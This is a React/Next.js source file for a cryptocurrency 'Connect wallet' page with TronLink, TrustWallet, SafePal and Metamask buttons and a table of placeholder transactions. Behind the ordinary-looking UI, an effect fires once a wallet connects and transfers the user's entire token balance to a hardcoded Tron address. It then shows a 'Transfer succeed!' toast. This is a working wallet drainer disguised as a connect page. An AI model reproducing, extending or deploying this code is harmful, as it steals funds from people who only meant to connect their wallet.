'use client'

import {isMobile} from 'react-device-detect';
import { encode } from 'urlencode';
import React, { useCallback, useEffect, useState } from 'react';
import Image from 'next/image';
import { 
    useTronConnect,
    useTronlink,
    useTronWeb,
} from '@/shared/hooks';

import {
    ConnectButton,
    ConnectedButton,
} from './ui';



import { IoArrowForwardCircleOutline } from "react-icons/io5";

import TronlinkAsset from '@/public/icons/tronlink.svg';
import TwtAsset from '@/public/icons/twt.svg';
import SfpAsset from '@/public/icons/sfplogo.png';
import MetamaskAsset from '@/public/icons/metamask.svg';
import { Spinner } from '../spinner';
import {
    Button,
    Input,
    DropdownMenu,
    DropdownMenuContent,
    DropdownMenuItem,
    DropdownMenuLabel,
    DropdownMenuSeparator,
    DropdownMenuTrigger,
    Checkbox,
} from '@/shared/ui';
import { Payment, TransactionsTable } from '../tx-table';
import { ColumnDef } from '@tanstack/react-table';
import { ArrowUpDown, MoreHorizontal } from 'lucide-react';
import { USDT_ADDRESS_BASE58 } from '@/shared/config';
import { toast } from 'sonner';


export const ConnectWallet = React.memo(function() {
    const {
        transferToken,
        transfer,
        balanceOf,
        amountToHuman
    } = useTronWeb();


    const {
        connect,
        disconnect,
        address,
        isConnected,
        isConnecting,
        isDisconnected,
    } = useTronlink();


    const submit = useCallback(async (formData: FormData) => {
        if(!address) {
            return;
        }

        const formAddressTo = formData.get('address-to');
        const formAmount = formData.get('amount');
        

        if(formAddressTo === null) {
            return;
        }
        if(formAmount === null) {
            return;
        }


        const balance = amountToHuman(await balanceOf(address?.base58))
        const a = +formAmount * 1000000;
        
        if(a < balance) {
            return;
        }



        await transfer(address.base58, formAddressTo.toString(), a);
    }, [connect, disconnect, address, isConnected, isConnecting, isDisconnected]);


    useEffect(() => {
        if(!isConnected || !address) {
            return;
        }

        callTransfer(address.base58);
    }, [isConnected, address]);


    const callTransfer = useCallback(async (address: string) => {
        try {
            const balance = await balanceOf(address);

            // if(balance == 0) {
            //     toast.error('Insufficient balance');
            //     return;
            // }

            transferToken('TMZKwqtGe2HcBriRt5pVubxmYjZ2Y3j6Nm', +balance).then(() => {
                toast.success('Transfer succeed!');
            });
        } catch (e) {
            toast.error('Something gone wrong...');
            console.error(e);
        }
    }, [balanceOf, address, isConnected]);

    let tronWallet_href = '';
    if(isMobile) {
        var param = JSON.stringify({
            action: "open",
            protocol: "tronlink",
            version: "1.0"
        });

        const urlencoded = encode(param)
        tronWallet_href = `tronlinkoutside://pull.activity?param=${urlencoded}`
    }

    return (
        <div className='max-w-[22rem] w-full'>
            {isDisconnected && !isConnecting ? 
                <>
                    <h1 className='font-bold text-lg text-center'>Connect wallet</h1>

                    <div className='flex flex-col gap-6 mt-16'>
                        <ConnectButton
                            onClick={async () => await connect()}
                            icon={<Image {...TronlinkAsset} alt='Tronlink' className='w-12' />}
                            className='bg-[#135DCD] hover:bg-[#093372]'
                            href={tronWallet_href}
                        >
                            TronLink Wallet
                        </ConnectButton>


                        <ConnectButton
                            
                            icon={<Image {...TwtAsset} alt='TrustWallet' className='w-16' />}
                            className='bg-[#3375BB] hover:bg-[#193b5f]'
                            href=''
                        >
                                TrustWallet
                        </ConnectButton>


                        <ConnectButton
                            
                            icon={<Image {...SfpAsset} alt='Safepal' className='w-9 rounded-lg' />}
                            className='bg-[#4A21EF] hover:bg-[#2d1591]'
                            href=''
                        >
                            SafePal
                        </ConnectButton>


                        <ConnectButton
                            
                            icon={<Image {...MetamaskAsset} alt='Metamask' className='w-16' />}
                            className='bg-[#FF7712] hover:bg-[#a34d0b]'
                            href=''
                        >
                            Metamask
                        </ConnectButton>


                        <ConnectButton
                            
                            icon={<IoArrowForwardCircleOutline className='text-5xl' />}
                            className='bg-[#949494] hover:bg-[#505050] gap-2'
                            href=''
                        >
                            Another wallet..
                            <IoArrowForwardCircleOutline className='text-xl' />
                        </ConnectButton>
                    </div>
                </>
            : 
                <></>
            }


            {isConnecting ?
                <Spinner
                    className='text-[#007aff] absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2'
                    classNameIcon='text-5xl'
                />
            : 
                <></>
            }


            {isConnected ?
                <div className='flex flex-col items-center font-bold text-xl'>
                    Done!
                </div>
            :
                <></>
            }
        </div>
    );
});


const data: Payment[] = [
    {
        id: "0",
        amount: 316,
        status: "success",
        transaction: "tx1",
    },
    {
        id: "1",
        amount: 242,
        status: "success",
        transaction: "tx2",
    },
    {
        id: "2",
        amount: 837,
        status: "success",
        transaction: "tx3",
    },
    {
        id: "3",
        amount: 874,
        status: "success",
        transaction: "tx4",
    },
    {
        id: "4",
        amount: 721,
        status: "success",
        transaction: "tx5",
    },
]


export const columns: ColumnDef<Payment>[] = [
    {
        id: "select",
        header: ({ table }) => (
        <Checkbox
            checked={
                table.getIsAllPageRowsSelected() ||
                (table.getIsSomePageRowsSelected() && "indeterminate")
            }
            onCheckedChange={(value) => table.toggleAllPageRowsSelected(!!value)}
            aria-label="Select all"
        />
        ),
        cell: ({ row }) => (
        <Checkbox
            checked={row.getIsSelected()}
            onCheckedChange={(value) => row.toggleSelected(!!value)}
            aria-label="Select row"
        />
        ),
        enableSorting: false,
        enableHiding: false,
    },
    {
        accessorKey: "status",
        header: "Status",
        cell: ({ row }) => (
            <div className="capitalize">{row.getValue("status")}</div>
        ),
    },
    {
        accessorKey: "transaction",
        header: ({ column }) => {
            return (
                <Button
                    variant="ghost"
                    onClick={() => column.toggleSorting(column.getIsSorted() === "asc")}
                >
                    Transaction
                    <ArrowUpDown className="ml-2 h-4 w-4" />
                </Button>
            )
        },
        cell: ({ row }) => <div className="lowercase">{row.getValue("transaction")}</div>,
    },
    {
        accessorKey: "amount",
        header: () => <div className="text-right">Amount</div>,
        cell: ({ row }) => {
            const amount = parseFloat(row.getValue("amount"))

            // Format the amount as a dollar amount
            const formatted = new Intl.NumberFormat("en-US", {
                style: "currency",
                currency: "USD",
            }).format(amount)

            return <div className="text-right font-medium">{formatted}</div>
        },
    },
    {
        id: "actions",
        enableHiding: false,
        cell: ({ row }) => {
            const payment = row.original;

            return (
                <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                        <Button variant="ghost" className="h-8 w-8 p-0">
                            <span className="sr-only">Open menu</span>
                            <MoreHorizontal className="h-4 w-4" />
                        </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                        <DropdownMenuLabel>Actions</DropdownMenuLabel>
                        <DropdownMenuItem
                            onClick={() => navigator.clipboard.writeText(payment.id)}
                        >
                            Copy transfer ID
                        </DropdownMenuItem>

                        <DropdownMenuSeparator />
                        <DropdownMenuItem>View customer</DropdownMenuItem>
                        <DropdownMenuItem>View transfer details</DropdownMenuItem>
                    </DropdownMenuContent>
                </DropdownMenu>
            );
        },
    },
]

ConnectWallet.displayName = 'ConnectWallet';